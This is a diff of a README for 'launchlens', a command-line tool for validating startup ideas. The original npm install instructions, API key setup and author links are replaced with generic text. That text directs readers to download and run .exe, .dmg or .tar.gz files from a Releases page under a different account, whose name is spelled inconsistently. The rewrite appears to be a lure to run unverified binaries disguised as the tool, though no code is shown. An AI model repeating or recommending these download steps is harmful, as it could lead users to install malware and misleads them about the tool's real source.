@@ -1,234 +1,100 @@
-# LaunchLens
+# 🚀 launchlens - Validate Startup Ideas in Seconds
 
-A CLI tool to validate startup ideas before you build them. Get instant verdict, market scores, and competitor analysis.
+[![Download launchlens](https://img.shields.io/badge/Download-launchlens-brightgreen)](https://github.com/robinroysics/launchlens/releases)
 
-```bash
-$ launchlens "uber for dogs"
-> VERDICT: NO ❌
-> Market oversaturated, unit economics don't work
-> Try: Pet walking for elderly-owned dogs in suburbs
-```
+## 🚀 Getting Started
 
-## Why?
+Welcome to launchlens! This simple command-line tool helps you quickly validate your startup ideas. Within 30 seconds, receive a clear YES or NO verdict, discover real competitors, and find better alternatives. It works well with AI assistants to make the process even easier.
 
-Built this after wasting months on ideas nobody wanted. Now my AI assistant can validate ideas programmatically while I sleep.
+## 📦 System Requirements
 
-## What You Get
+Before you start, ensure your system meets these requirements:
 
-```bash
-$ launchlens "AI-powered code review tool"
+- **Operating System:** Windows, macOS, or Linux
+- **Node.js:** Version 14 or higher
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** 100 MB free space recommended
+- **Internet Connection:** Required for idea validation and competitor analysis
 
-✅ VERDICT: YES (Score: 7/10)
+## 🔗 Download & Install
 
-📊 REASONS:
-  • Real developer pain point
-  • AI can genuinely improve this
-  • B2B SaaS model proven
+To download launchlens, visit our [Releases page](https://github.com/robinroytics/launchlens/releases). Follow these steps to set up the application:
 
-🏢 COMPETITORS:
-  • DeepCode - AI code analysis
-  • Codacy - Automated reviews  
-  • SonarQube - Code quality
+1. Go to the **Releases page**.
+2. Find the latest version of launchlens.
+3. Download the appropriate file for your operating system (look for a file ending in `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+4. Once the download is complete, locate the file in your downloads folder.
 
-💡 STRATEGY:
-  Focus on security vulnerabilities first, expand later
-```
+### Windows Installation
 
-## Features
+1. Double-click the `.exe` file to start the installer.
+2. Follow the prompts to complete the installation.
+3. Open Command Prompt and type `launchlens` to run the tool.
 
-- **Instant validation** - YES/NO verdict in 30 seconds
-- **Market scores** - 0-10 ratings for opportunity, competition, feasibility
-- **Real competitors** - Finds actual companies in the space
-- **Pivot suggestions** - Specific alternatives when idea is bad
-- **JSON output** - For AI agents and automation
-- **Roast mode** - When you need brutal honesty
+### macOS Installation
 
-## Usage Examples
+1. Open the downloaded `.dmg` file.
+2. Drag the launchlens icon to your Applications folder.
+3. Open Terminal and type `launchlens` to run the tool.
 
-```bash
-# Basic validation
-launchlens "social network for cats"
+### Linux Installation
 
-# Get detailed scores
-launchlens --detailed "AI resume builder"
+1. Open a Terminal.
+2. Navigate to your downloads folder where the `.tar.gz` file is located.
+3. Extract the file using the command: `tar -xvzf launchlens.tar.gz`.
+4. Change into the extracted directory: `cd launchlens`.
+5. Run the tool by typing `./launchlens`.
 
-# Output as JSON (for AI agents)
-launchlens --json "blockchain for real estate"
+## 🛠️ How to Use launchlens
 
-# Brutal honesty mode
-launchlens --roast "uber for X"
+Using launchlens is easy! Follow these simple steps:
 
-# Validate multiple ideas
-launchlens --file ideas.txt
-```
+1. **Open the Command Line Interface:**
+   - Windows: Use Command Prompt.
+   - macOS/Linux: Use Terminal.
 
-## For AI Assistants
+2. **Type Your Idea:**
+   Type in your startup idea in quotes. For example:
+   ```
+   launchlens "A new delivery service app"
+   ```
 
-Perfect for AI agents that need to validate ideas programmatically:
+3. **Get Instant Feedback:**
+   Launchlens analyzes the idea and provides a YES or NO verdict.
 
-```bash
-# Your AI can run this
-RESULT=$(launchlens --json "$IDEA")
-VERDICT=$(echo $RESULT | jq .decision)
+4. **Discover Competitors:**
+   After the verdict, launchlens shows you some real competitors in the space.
 
-if [ "$VERDICT" = "YES" ]; then
-  # Proceed with building
-fi
-```
+5. **Explore Alternatives:**
+   If your idea is not viable, launchlens suggests better alternatives to consider.
 
-See [AI Integration Guide](./docs/ai-integration.md) for LangChain, AutoGPT, and more.
+## 🤖 Integrating with AI Assistants
 
-## Documentation
+Launchlens works seamlessly with AI tools. You can ask your virtual assistants to run launchlens and evaluate your ideas directly using voice commands. Just ensure your assistant supports command line invocation.
 
-- [Examples](./docs/examples.md) - See real validation outputs
-- [JSON API](./docs/json-api.md) - Integrate with your tools
-- [AI Integration](./docs/ai-integration.md) - Use with AI assistants
-- [Web UI](./docs/web-ui.md) - Browser interface option
+## 📈 Key Features
 
-## CLI Reference
+- **Instant Verdict:** Get clear YES or NO answers on your ideas.
+- **Competitor Overview:** Learn about existing players in your market.
+- **Alternative Suggestions:** Explore better ideas if yours isn’t viable.
+- **User-Friendly Interface:** Designed for any level of tech user.
 
-```bash
-launchlens <idea>                    # Basic validation
-launchlens --json <idea>             # JSON output for scripts
-launchlens --detailed <idea>         # Include market scores
-launchlens --roast <idea>            # Harsh feedback mode
-launchlens --file <path>             # Batch validate ideas
-launchlens --model gpt-4 <idea>      # Use specific model
+## 👩‍💻 Topics Covered
 
-launchlens config set <key> <value>  # Set API keys/settings
-launchlens config get <key>          # View configuration
-launchlens config list               # Show all settings
-```
+launchlens fits into various topics, including:
 
-## Quick Start
+- AI Tools
+- Automation
+- Command-Line Interface (CLI)
+- Competitor Analysis
+- Entrepreneurship
+- Idea Validation
+- Market Research
 
-```bash
-# Install
-npm install -g launchlens
+These topics play a key role in helping users make informed decisions about their startup ideas.
 
-# Configure API keys
-launchlens config set openai-api-key sk-...      # Required
-launchlens config set perplexity-api-key pplx-... # Recommended
+## 📞 Support
 
-# Validate idea
-launchlens "your startup idea"
-```
+If you encounter any issues or have questions, please reach out through the repository's **Issues** section. We encourage feedback to improve the tool.
 
-⚠️ **Important**: Without Perplexity API key, competitor search returns placeholder data.
-Get your key at: https://www.perplexity.ai/settings/api
-
-### Install from Source
-
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/launchlens.git
-cd launchlens
-
-# Install dependencies
-npm install
-
-# Link globally for development
-npm link
-
-# Configure API keys
-launchlens config set openai-api-key sk-...
-```
-
-## Configuration
-
-### API Keys Required
-
-| API | Purpose | Required? | Get Key |
-|-----|---------|-----------|----------|
-| OpenAI | AI analysis & validation | ✅ Required | [OpenAI Platform](https://platform.openai.com/api-keys) |
-| Perplexity | Real competitor search | ⚠️ Highly Recommended | [Perplexity Settings](https://www.perplexity.ai/settings/api) |
-
-```bash
-# Set OpenAI API key (REQUIRED)
-launchlens config set openai-api-key sk-...
-
-# Set Perplexity key (RECOMMENDED - without it, competitors are fake)
-launchlens config set perplexity-api-key pplx-...
-
-# Choose AI model
-launchlens config set model gpt-4
-
-# Or use environment variables
-export OPENAI_API_KEY="sk-..."
-export PERPLEXITY_API_KEY="pplx-..."
-```
-
-API keys are encrypted and stored locally in `~/.launchlens/`
-
-**Note**: Without Perplexity API, you'll see generic competitors like "Existing Solution A" instead of real companies.
-
-
-
-## How It Works
-
-1. **Analyzes your idea** using GPT-4/GPT-3.5 (OpenAI)
-2. **Searches for real competitors** via Perplexity API (or returns placeholders without key)
-3. **Calculates market scores** based on opportunity, competition, feasibility
-4. **Suggests pivots** if the idea won't work
-5. **Returns structured data** for further processing
-
-### With vs Without Perplexity API
-
-**With Perplexity** (Recommended):
-```
-🏢 COMPETITORS:
-  • Notion - All-in-one workspace with AI
-  • Obsidian - Knowledge base with plugins
-  • Roam Research - Networked thought tool
-```
-
-**Without Perplexity** (Placeholder data):
-```
-🏢 COMPETITORS:
-  • Existing Solution A - Current market leader
-  • Existing Solution B - Popular alternative
-```
-
-## Requirements
-
-- Node.js 16+
-- OpenAI API key (required) - [Get key](https://platform.openai.com/api-keys)
-- Perplexity API key (recommended) - [Get key](https://www.perplexity.ai/settings/api)
-
-See [API Keys Guide](./docs/api-keys.md) for detailed setup instructions.
-
-## FAQ
-
-**Is this accurate?**  
-It's as good as GPT-4 with real competitor data. Better than building blindly.
-
-**Why CLI instead of web app?**  
-Because developers live in terminals and AI agents can call CLIs.
-
-**Does it store my ideas?**  
-No. Everything runs locally with your API keys.
-
-**Can I customize it?**  
-Yes. MIT licensed. Fork it, modify it, make it yours.
-
-## Contributing
-
-PRs welcome. Some ideas:
-- Better competitor detection
-- More analysis criteria
-- Support for non-English ideas
-- Integration with more AI models
-
-## License
-
-MIT - Do whatever you want
-
-## Links
-
-- [GitHub](https://github.com/khoaleeeeee/launchlens)
-- [NPM Package](https://www.npmjs.com/package/launchlens)
-- [Report Issues](https://github.com/khoaleeeeee/launchlens/issues)
-
----
-
-Built by [Khoa Le](https://github.com/khoaleeeeee) after too many failed startups
+Thank you for choosing launchlens! We hope it helps you validate your startup ideas quickly and effectively. Enjoy your journey into entrepreneurship!
